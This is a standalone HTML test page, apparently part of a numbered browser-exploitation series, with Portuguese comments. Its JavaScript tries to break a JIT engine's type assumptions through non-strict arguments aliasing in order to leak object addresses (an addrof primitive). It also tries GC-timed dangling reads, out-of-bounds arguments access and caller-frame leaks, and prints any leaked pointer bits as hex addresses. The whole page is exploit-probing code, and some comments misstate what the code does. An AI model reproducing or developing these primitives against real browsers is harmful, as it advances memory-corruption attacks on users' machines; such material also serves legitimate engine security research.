<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 14 - Arguments Aliasing JIT</title></head>
<body>
<h2>TEST 14 - Arguments Object Aliasing em JIT (non-strict)</h2>
<p>Alvo: corromper assumpcao do JIT via aliasing entre arguments[] e parametros formais</p>
<p>API: arguments object (non-strict mode), Function, eval</p>
<p>Tecnica: em non-strict mode, arguments[i] e o parametro formal i sao aliases bidirecionais.
Se JIT assume que o parametro e de tipo double mas arguments[i] e sobrescrito via
side-effect, o valor lido pode ser um objeto tratado como double (addrof primitivo).</p>

<pre id="log">Aguardando...</pre>
<button onclick="testArgAlias()">ARGS ALIASING</button>
<button onclick="testArgLeakAddr()">LEAK ADDR VIA ARGS</button>
<button onclick="testArgumentsLength()">ARGUMENTS LENGTH MUTATION</button>
<button onclick="testCallerLeak()">ARGUMENTS.CALLEE/CALLER</button>

<script>
var log = document.getElementById('log');
function append(msg) { log.textContent += '\n' + msg; }

function forceGC() {
  var t = [];
  for (var i = 0; i < 30000; i++) t.push({x:i});
  t = null;
}

// NON-STRICT: arguments[0] e alias de 'x'
function hotWithAlias(x, helper) {
  // JIT especializa: x e double
  var result = x + 1.0;
  // helper pode mudar arguments[0] via aliasing
  if (helper) helper(arguments);
  // JIT ainda assume x e double, mas pode ser objeto agora
  return x + 2.0; // <- se x virou objeto: NaN ou crash
}

function testArgAlias() {
  append('[14] Arguments aliasing: warmup JIT assumindo x=double...');

  // Warmup sem helper - JIT especializa para double
  for (var i = 0; i < 100000; i++) {
    hotWithAlias(1.337 + i, null);
  }
  append('[14] Warmup completo (100k iteracoes)');

  // Agora passar helper que troca arguments[0] para objeto
  var victimObj = {evil: true, value: 0x41414141};
  var callCount = 0;

  function evilHelper(args) {
    callCount++;
    args[0] = victimObj; // Troca x (double) por objeto via aliasing
    // args[0] = victimObj TAMBEM muda 'x' dentro da funcao (aliasing)
  }

  try {
    var result = hotWithAlias(1.337, evilHelper);
    append('[14] hotWithAlias com objeto injetado via args: ' + result);
    append('[14] Esperado NaN se JIT assumiu double: isNaN=' + isNaN(result));
    append('[14] callCount: ' + callCount);

    // Resultado nao-NaN quando objeto e passado = possivel addrof
    if (!isNaN(result) && result !== 3.337) {
      append('[14] *** VALOR INESPERADO: possivel bits de ponteiro como double! ***');
      // Interpretar como endereco
      var buf = new ArrayBuffer(8);
      var f64 = new Float64Array(buf);
      var u32 = new Uint32Array(buf);
      f64[0] = result;
      append('[14] Como endereco: 0x' + u32[1].toString(16) + u32[0].toString(16));
    }

  } catch(e) {
    append('[14] Aliasing EXCECAO: ' + e.message);
  }
}

function leakable(x) {
  // Versao mais agressiva: acessar x apos GC e alias
  var snapshot = x;
  arguments[0] = null;
  forceGC();
  // snapshot pode agora ser uma referencia dangling se GC moveu o objeto
  return snapshot + 0.0; // forcar conversao numerica de snapshot
}

function testArgLeakAddr() {
  append('[14] Tentando leak de endereco via arguments aliasing + GC...');

  // Warmup leakable com doubles
  for (var i = 0; i < 50000; i++) leakable(i * 1.1);
  append('[14] Warmup leakable OK');

  try {
    // Objetos-alvo que queremos vazar o endereco
    var targets = [
      {secret: 0xDEAD, data: new Float64Array(8)},
      {secret: 0xBEEF, nested: {inner: [1,2,3]}},
      new Uint8Array(256),
      new ArrayBuffer(1024),
    ];

    for (var t = 0; t < targets.length; t++) {
      var leaked = leakable(targets[t]);
      append('[14] leakable(target[' + t + ']): ' + leaked);
      if (!isNaN(leaked) && leaked !== 0) {
        var buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = leaked;
        var u32 = new Uint32Array(buf);
        append('[14] *** POSSIVEL ADDR: 0x' + u32[1].toString(16) + u32[0].toString(16) + ' ***');
      }
    }
  } catch(e) {
    append('[14] Leak addr EXCECAO: ' + e.message);
  }
}

function testArgumentsLength() {
  append('[14] Mutacao de arguments.length durante operacao...');

  function variadicFn() {
    var originalLen = arguments.length;
    append('[14] variadicFn chamada com ' + originalLen + ' argumentos');

    // Mudar length via defineProperty (se possivel)
    try {
      Object.defineProperty(arguments, 'length', {value: 100000});
      append('[14] arguments.length forcado para: ' + arguments.length);
    } catch(e) {
      append('[14] defineProperty em arguments.length: ' + e.message);
    }

    // Iterar ate o novo length (fora dos bounds originais)
    var sum = 0;
    var outOfBounds = 0;
    for (var i = 0; i < arguments.length && i < 20; i++) {
      var v = arguments[i];
      if (i >= originalLen) {
        outOfBounds++;
        append('[14] OOB arguments[' + i + ']: ' + v + ' (tipo: ' + typeof v + ')');
      } else {
        sum += (typeof v === 'number' ? v : 0);
      }
    }
    append('[14] sum=' + sum + ' | outOfBounds acessos=' + outOfBounds);
    return sum;
  }

  try {
    var r = variadicFn(1.1, 2.2, 3.3, 4.4, 5.5);
    append('[14] variadicFn result: ' + r);
  } catch(e) {
    append('[14] variadicFn EXCECAO: ' + e.message);
  }
}

function testCallerLeak() {
  append('[14] arguments.callee chain para info leak...');

  try {
    function inner() {
      // arguments.callee e a propria funcao (non-strict)
      var self = arguments.callee;
      append('[14] arguments.callee name: ' + self.name);
      append('[14] arguments.callee.length: ' + self.length);

      // arguments.caller pode revelar o frame chamador (deprecated mas pode estar presente)
      // Em alguns WebKit antigos, isso vaza o frame de pilha
      try {
        var caller = arguments.callee.caller;
        append('[14] arguments.callee.caller: ' + (caller ? caller.name : 'null'));
        if (caller) {
          // Acessar variaveis locais do chamador via arguments do caller
          append('[14] caller.arguments: ' + (caller.arguments ? caller.arguments.length + ' args' : 'null'));
        }
      } catch(ce) {
        append('[14] .caller acesso: ' + ce.message);
      }

      // Tentar construir chain de chamadas
      return self.toString().length; // Serializar o bytecode da funcao
    }

    function outer(x, y) {
      return inner();
    }

    var r = outer(0xDEAD, 0xBEEF);
    append('[14] inner() retornou: ' + r);
    append('[14] Tamanho do source de inner: ' + inner.toString().length);

  } catch(e) {
    append('[14] Caller leak EXCECAO: ' + e.message);
  }
}
</script>
</body>
</html>
